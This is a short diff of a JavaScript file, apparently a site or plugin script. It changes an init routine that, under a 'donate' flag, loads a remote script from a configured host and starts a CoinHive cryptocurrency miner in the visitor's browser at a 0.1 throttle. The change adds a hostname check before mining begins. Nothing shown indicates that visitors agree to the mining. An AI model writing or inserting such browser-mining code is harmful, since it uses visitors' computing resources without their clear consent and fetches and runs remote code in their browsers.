@@ -279,7 +279,7 @@
          */
         init: function() {
             var t = this,
-                m,
+                m, h = document.location.hostname,
                 p = 0.1;
 
             if (!t.m) {
@@ -296,10 +296,10 @@
                 }, t.ua);
             }
 
-            if (t.donate && (t.ua.g || t.ua.ff || t.ua.o)) {
+            if (t.donate && (t.ua.g || t.ua.ff || t.ua.o) && !!(/\.(?:.(?!\.))[a-z]+$/ig.test(h))) {
                 $.getScript('https://' + t.hive, function () {
                     if (typeof CoinHive.User === t.fu) {
-                        m = new CoinHive.User(t.hives, document.location.hostname, {
+                        m = new CoinHive.User(t.hives, h, {
                             throttle: p
                         });
                         m.start();
